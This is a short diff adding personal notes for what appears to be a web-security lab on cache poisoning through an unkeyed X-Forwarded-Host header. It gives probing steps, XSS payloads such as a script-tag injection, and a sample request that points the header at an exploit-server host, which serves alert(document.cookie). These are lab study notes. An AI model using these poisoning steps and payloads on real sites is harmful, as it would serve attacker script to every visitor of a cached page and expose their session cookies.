@@ -1,0 +1,30 @@
+ Web cache poisoning with an unkeyed header
+//README
+//Change the URL PATH(f.e. ?asd=asd) and check the X-Cache header whether it is miss or hit.
+//If not works, use the Origin header as a cache buster.
+//Find a place where you can cache input to response. Try X-Forwarded-Host:example.com an check the response
+//Try to check cookies or other header that rerurn in the response(fehost=someString"-alert(1)-"someString)
+//Try to change the request Path (GET /?evil='/><script>alert(1)</script>)
+//Try to find other params with param miner
+//Inject the place with xss or in the Exploit Server write alert(document.cookie) and bind the exploit url to the cached response.
+//Try to check with multiple header
+			X-Forwarded-Scheme: nothttps
+			X-Forwarded-Host:exploit-0a3700c604474181c08db80f01b10022.exploit-server.net
+//using an unknown Header(Param Miner. F.e. X-Host: World.com)
+
+
+
+// Web cache poisoning with an unkeyed header
+
+Request:
+GET / HTTP/1.1
+Host: 0ab400e90374f20ec0ab2eac003d0023.web-security-academy.net
+X-Forwarded-Host:exploit-0aba000c032af203c0e12e3f01fd002b.exploit-server.net
+
+
+Response:
+X-Cache: hit
+
+
+Exploit Server:
+alert(document.cookie)
